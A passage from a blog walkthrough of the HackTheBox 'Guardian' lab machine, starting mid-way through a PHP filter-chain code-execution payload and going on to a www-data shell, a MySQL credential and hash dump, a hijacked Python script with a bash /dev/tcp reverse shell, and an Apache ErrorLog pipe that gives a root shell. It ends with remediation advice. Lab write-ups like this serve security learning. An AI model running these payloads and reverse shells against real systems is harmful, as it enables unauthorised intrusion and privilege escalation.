AC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource<span style=color:#f92672>=</span>php://temp
</span></span></code></pre></div><p>now can you copy and paste ,send to see if we can see the <code>id</code>.</p><p><em>Remember to add <code>,system.php</code> at the end incase you forgot for it to work in burp.</em></p><p><img src=images/guardian-htb-release-area-machine_admin-reports-6.png alt=guardian-htb-release-area-machine_admin-reports-6.png></p><p>so set your kali listener here we will use <strong>penelope</strong></p><p>after sending the output we get ashell as <code>www-data</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>└─$ penelope -p <span style=color:#ae81ff>4444</span>                                                                                                            
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Listening <span style=color:#66d9ef>for</span> reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 172.16.147.139 • 172.17.0.1 • 10.10.14.70
</span></span><span style=display:flex><span>- 🏠 Main Menu <span style=color:#f92672>(</span>m<span style=color:#f92672>)</span> 💀 Payloads <span style=color:#f92672>(</span>p<span style=color:#f92672>)</span> 🔄 Clear <span style=color:#f92672>(</span>Ctrl-L<span style=color:#f92672>)</span> 🚫 Quit <span style=color:#f92672>(</span>q/Ctrl-C<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Got reverse shell from guardian~10.129.101.248-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Attempting to upgrade shell to PTY...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Shell upgraded successfully using /usr/bin/python3! 💪
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Interacting with session <span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>, Shell Type: PTY, Menu key: F12 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Logging to /home/kali/.penelope/guardian~10.10.11.84 -Linux-x86_64/2025_09_01-09_15_08-425.log 📜
</span></span><span style=display:flex><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span style=display:flex><span>www-data@guardian:~/portal.guardian.htb/admin$
</span></span></code></pre></div><p>looking around we see that port 3306 is open so we can leverage it to mysql.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@guardian:~/portal.guardian.htb/admin$ netstat -tunlp
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>Not all processes could be identified, non-owned process info
</span></span><span style=display:flex><span> will not be shown, you would have to be root to see it all.<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Active Internet connections <span style=color:#f92672>(</span>only servers<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
</span></span><span style=display:flex><span>tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::22                   :::*                    LISTEN      -                   
</span></span><span style=display:flex><span>udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 127.0.0.53:53           0.0.0.0:*                           -                   
</span></span><span style=display:flex><span>udp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> 0.0.0.0:68              0.0.0.0:*                           -
</span></span></code></pre></div><p>lets do the mysql thing the password we find it here:</p><p><img src=images/password.png alt=password.png></p><p>so now lets acccess it;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>www-data@guardian:~$ mysql -h 127.0.0.1 -u root -pGu4rd14n_un1_1s_th3_b3st guardiandb
</span></span><span style=display:flex><span>mysql: <span style=color:#f92672>[</span>Warning<span style=color:#f92672>]</span> Using a password on the command line interface can be insecure.
</span></span><span style=display:flex><span>Reading table information <span style=color:#66d9ef>for</span> completion of table and column names
</span></span><span style=display:flex><span>You can turn off this feature to get a quicker startup with -A
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Welcome to the MySQL monitor.  Commands end with ; or <span style=color:#ae81ff>\g</span>.
</span></span><span style=display:flex><span>Your MySQL connection id is <span style=color:#ae81ff>1276</span>
</span></span><span style=display:flex><span>Server version: 8.0.43-0ubuntu0.22.04.1 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> 2000, 2025, Oracle and/or its affiliates.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Oracle is a registered trademark of Oracle Corporation and/or its
</span></span><span style=display:flex><span>affiliates. Other names may be trademarks of their respective
</span></span><span style=display:flex><span>owners.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Type <span style=color:#e6db74>&#39;help;&#39;</span> or <span style=color:#e6db74>&#39;\h&#39;</span> <span style=color:#66d9ef>for</span> help. Type <span style=color:#e6db74>&#39;\c&#39;</span> to clear the current input statement.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>mysql&gt; show databases;
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| Database           |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span>| guardiandb         |
</span></span><span style=display:flex><span>| information_schema |
</span></span><span style=display:flex><span>| mysql              |
</span></span><span style=display:flex><span>| performance_schema |
</span></span><span style=display:flex><span>| sys                |
</span></span><span style=display:flex><span>+--------------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>mysql&gt; use guardiandb;
</span></span><span style=display:flex><span>Database changed
</span></span><span style=display:flex><span>mysql&gt; show tables;
</span></span><span style=display:flex><span>+----------------------+
</span></span><span style=display:flex><span>| Tables_in_guardiandb |
</span></span><span style=display:flex><span>+----------------------+
</span></span><span style=display:flex><span>| assignments          |
</span></span><span style=display:flex><span>| courses              |
</span></span><span style=display:flex><span>| enrollments          |
</span></span><span style=display:flex><span>| grades               |
</span></span><span style=display:flex><span>| messages             |
</span></span><span style=display:flex><span>| notices              |
</span></span><span style=display:flex><span>| programs             |
</span></span><span style=display:flex><span>| submissions          |
</span></span><span style=display:flex><span>| users                |
</span></span><span style=display:flex><span>+----------------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>9</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>mysql&gt; <span style=color:#66d9ef>select</span> * from users;
</span></span><span style=display:flex><span>+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
</span></span><span style=display:flex><span>| user_id | username           | password_hash                                                    | full_name            | email                           | dob        | address                                                                       | user_role | status | created_at          | updated_at          |
</span></span><span style=display:flex><span>+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
</span></span><span style=display:flex><span>|       <span style=color:#ae81ff>1</span> | admin              | 694a63de406521120d9b905ee94bae3d863ff9f6637d7b7cb730f7da535fd6d6 | System Admin         | admin@guardian.htb              | 2003-04-09 | <span style=color:#ae81ff>2625</span> Castlegate Court, Garden Grove, California, United States, <span style=color:#ae81ff>92645</span>         | admin     | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
</span></span><span style=display:flex><span>|       <span style=color:#ae81ff>2</span> | jamil.enockson     | c1d8dfaeee103d01a5aec443a98d31294f98c5b4f09a0f02ff4f9a43ee440250 | Jamil Enocksson      | jamil.enockson@guardian.htb     | 1999-09-26 | <span style=color:#ae81ff>1061</span> Keckonen Drive, Detroit, Michigan, United States, <span style=color:#ae81ff>48295</span>                  | admin     | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
</span></span><span style=display:flex><span>|       <span style=color:#ae81ff>3</span> | mark.pargetter     | 8623e713bb98ba2d46f335d659958ee658eb6370bc4c9ee4ba1cc6f37f97a10e | Mark Pargetter       | mark.pargetter@guardian.htb     | 1996-04-06 | <span style=color:#ae81ff>7402</span> Santee Place, Buffalo, New York, United States, <span style=color:#ae81ff>14210</span>                    | admin     | active | 2025-09-01 13:00:02 | 2025-09-01 13:00:02 |
</span></span><span style=display:flex><span>etc |
</span></span><span style=display:flex><span>+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
</span></span><span style=display:flex><span><span style=color:#ae81ff>63</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>we re interested in this three so we cut them to crash the hashes</p><p>lets go</p><p><img src=images/passhashcat.png alt=passhashcat.png></p><p>and boom a few minutes though my laptop did overheat but we got it.</p><p><img src=images/hashcat.png alt=hashcat.png></p><p>we got admin and jamil,so lets ssh this thing once and for all</p><p><img src=images/ssh.user.txt.png alt=ssh.user.txt.png></p><p>and boom we got the user flag.</p><p>we are in jamil so before exiting lets do some recon we can find the root here(just kidding)</p><p><code>jamil</code> can run the commands with <code>mark</code> privileges. So our next escalated target is <code>mark</code>.</p><p>Now we gonna check out this one <code>/opt/scripts/utilities/utilities.py</code></p><p><img src=images/utilities.png alt=utilities.png></p><p>chacked file permissions and saw that only mark can run other functions, but system-status</p><p>can run by anyone. Let’s check out /opt/scripts/utilities/utils</p><p>We can see that file <code>status.py</code> was written by <code>mark</code> and <code>admins</code> group.</p><p>after a small research we saw we can  hijack <code>status.py</code> to get <code>mark</code> shell.</p><p>so lets backup the original file first <code>status.py</code> </p><p><img src=images/bak.png alt=bak.png></p><p>so now lets modify  <code>status.py</code> to our malicious execution script we need to get shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># status.py </span>
</span></span><span style=display:flex><span>import platform
</span></span><span style=display:flex><span>import psutil
</span></span><span style=display:flex><span>import os
</span></span><span style=display:flex><span>import subprocess
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>def system_status<span style=color:#f92672>()</span>:
</span></span><span style=display:flex><span>    print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;System:&#34;</span>, platform.system<span style=color:#f92672>()</span>, platform.release<span style=color:#f92672>())</span>
</span></span><span style=display:flex><span>    print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;CPU usage:&#34;</span>, psutil.cpu_percent<span style=color:#f92672>()</span>, <span style=color:#e6db74>&#34;%&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    print<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;Memory usage:&#34;</span>, psutil.virtual_memory<span style=color:#f92672>()</span>.percent, <span style=color:#e6db74>&#34;%&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>    subprocess.run<span style=color:#f92672>([</span><span style=color:#e6db74>&#34;/bin/bash&#34;</span>, <span style=color:#e6db74>&#34;-c&#34;</span>, <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.70/4444 0&gt;&amp;1&#34;</span><span style=color:#f92672>])</span>
</span></span></code></pre></div><p>now lets set our listener…..and run the <code>utilities.py</code> via <code>mark</code></p><p>tip: to get the option we will use use the -h command</p><p><img src=images/utilitymark.png alt=utilitymark.png></p><p>and the shell coola and juicy!</p><p><img src=images/apachectlmark.png alt=apachectlmark.png></p><p>so mark can run safeapache2ctl thats a relief so lets go full force…..</p><p>Did a little research here so check it out  <a href=https://manpages.ubuntu.com/manpages/questing/en/man8/apache2ctl.8.html>apache2ctl</a> for more. Now we gonna create a mailicious config file and exploit to escalated to <code>root</code> via Apache <a href=https://httpd.apache.org/docs/2.4/mod/core.html#errorlog>ErrorLog</a> directive with <code>|</code> to executed the commands.</p><p><strong>Privilege Escalation</strong></p><p>we create it like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># shell.conf</span>
</span></span><span style=display:flex><span>LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
</span></span><span style=display:flex><span>ServerRoot <span style=color:#e6db74>&#34;/etc/apache2&#34;</span>
</span></span><span style=display:flex><span>ServerName localhost
</span></span><span style=display:flex><span>PidFile /tmp/apache-rs.pid
</span></span><span style=display:flex><span>Listen 127.0.0.1:8080
</span></span><span style=display:flex><span>ErrorLog <span style=color:#e6db74>&#34;|/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.70/5555 0&gt;&amp;1&#39;&#34;</span>
</span></span></code></pre></div><p>and then setup our penelope listener and  run the commands via <code>mark</code> sudo privileges.</p><p><img src=images/confshell.png alt=confshell.png></p><p>and boom we got a reverse shell as root</p><p><img src=images/rootshellfromconffile.png alt=rootshellfromconffile.png></p><p><img src=images/root.txt.png alt=root.txt.png></p><p>and there we got our cool root flag.</p><p>This is just one of the ways to exploit and get root there are many ways so use what suits you.</p><p><img src=images/final.png alt=final.png></p><hr><h2 id=summary>Summary</h2><blockquote><p>The Guardian HTB machine was successfully compromised through a multi-stage attack chain involving web enumeration, SQL injection, password cracking, privilege escalation via Python script hijacking, and finally root access through Apache configuration exploitation.</p></blockquote><h3 id=key-takeaways>Key Takeaways</h3><ul><li><strong>Initial Access:</strong> SQL injection vulnerability in the student portal allowed database access and credential extraction</li><li><strong>User Compromise:</strong> Hashcat successfully cracked SHA-256 password hashes for admin and jamil accounts</li><li><strong>Lateral Movement:</strong> Exploited sudo privileges to hijack <code>status.py</code> and escalate from jamil to mark</li><li><strong>Root Access:</strong> Leveraged Apache ErrorLog directive with pipe operator to execute commands as root</li></ul><h2 id=tools-used>Tools Used</h2><ul><li>Nmap - Network reconnaissance</li><li>Burp Suite - Web application testing and SQL injection</li><li>Hashcat - Password hash cracking</li><li>Penelope - Reverse shell listener</li><li>MySQL Client - Database enumeration</li></ul><h2 id=timeline>Timeline</h2><table><thead><tr><th><strong>Stage</strong></th><th><strong>Action</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td>Enumeration</td><td>Port scanning and subdomain discovery</td><td>Found portal.guardian.htb</td></tr><tr><td>Exploitation</td><td>SQL injection via UNION-based attack</td><td>Database access achieved</td></tr><tr><td>Credential Access</td><td>Extracted password hashes from users table</td><td>Cracked admin and jamil credentials</td></tr><tr><td>Initial Foothold</td><td>SSH access as jamil</td><td>User flag obtained</td></tr><tr><td>Privilege Escalation #1</td><td>Python script hijacking (status.py)</td><td>Shell as mark</td></tr><tr><td>Privilege Escalation #2</td><td>Apache ErrorLog exploitation</td><td>Root shell obtained</td></tr></tbody></table><h2 id=lessons-learned>Lessons Learned</h2><ul><li><strong>Input Validation:</strong> The application failed to properly sanitize user input, leading to SQL injection</li><li><strong>Password Security:</strong> Weak passwords combined with SHA-256 (without salting) made hash cracking feasible</li><li><strong>File Permissions:</strong> Writable Python modules in sensitive locations enabled privilege escalation</li><li><strong>Sudo Misconfigurations:</strong> Overly permissive sudo rules allowed lateral movement and root access</li><li><strong>Apache Configuration:</strong> The ErrorLog pipe feature can be weaponized when combined with sudo privileges</li></ul><h2 id=remediation-recommendations>Remediation Recommendations</h2><ul><li>Implement prepared statements to prevent SQL injection attacks</li><li>Use bcrypt or Argon2 with proper salting for password hashing instead of SHA-256</li><li>Restrict file permissions on critical scripts and configurations</li><li>Apply principle of least privilege to sudo configurations</li><li>Audit Apache configurations and restrict use of pipe operators in directives</li><li>Implement proper input validation and output encoding throughout the application</li></ul><h2 id=conclusion>Conclusion</h2><p>Guardian was an engaging machine that demonstrated real-world vulnerability chains. The exploitation path required solid understanding of web application security, Linux privilege escalation techniques, and creative thinking to leverage Apache configurations for root access. Special thanks to the HTB community and the machine creator for this learning opportunity.</p><aside>💡 **Note:** This writeup is for educational purposes only. Always ensure you have proper authorization before testing security vulnerabilities on any system.</aside><hr><p><em>Machine Difficulty:</em> Hard | <em>Platform:</em> HackTheBox | <em>Completion Date:</em> October 2025</p></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
2025
Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>